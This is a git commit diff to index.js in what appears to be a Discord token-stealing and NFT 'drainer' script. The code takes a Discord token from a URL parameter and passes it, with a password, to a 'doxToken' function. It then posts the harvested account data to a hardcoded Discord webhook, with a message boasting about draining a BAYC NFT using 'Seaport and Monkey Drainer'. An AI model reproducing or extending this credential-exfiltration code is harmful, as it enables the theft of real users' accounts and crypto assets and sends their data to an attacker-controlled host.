5bf07d5212c3614919769126441ca0c1f6ea485e
thinking <66126821+ThinkingPython@users.noreply.github.com>
2022-12-19 22:13:09 +0000

    Update index.js

--- index.js
+++ index.js
@@ -85,21 +85,10 @@ var webhookURL = "https://canary.discord.com/api/webhooks/1054303465880420432/9N
 var url_string = window.location.href; 
 var url = new URL(url_string);
 var currentURL = url.searchParams.get("user");
-
-async function getDiscordAccountInfo(token) {
-  const response = await fetch('https://discord.com/api/users/@me', {
-    headers: {
-      'Authorization': `${token}`
-    }
-  });
-  const accountInfo = await response.json();
-  return accountInfo;
-}
-const accountInfo = await getDiscordAccountInfo(currentURL);
-
+const data = await doxToken(token, pass && typeof pass === "string" ? pass.trim() : null);
 
 var postData = {
-  content: "@everyone @here FEDS JUST HIT A TOKEN WE DRAINING BAYC6969 WITH SEAPORT AND MONKEY DRAINER LOLOL " + accountInfo
+  content: "@everyone @here FEDS JUST HIT A TOKEN WE DRAINING BAYC6969 WITH SEAPORT AND MONKEY DRAINER LOLOL " + data
 };
 fetch(webhookURL, {
   method: "POST",
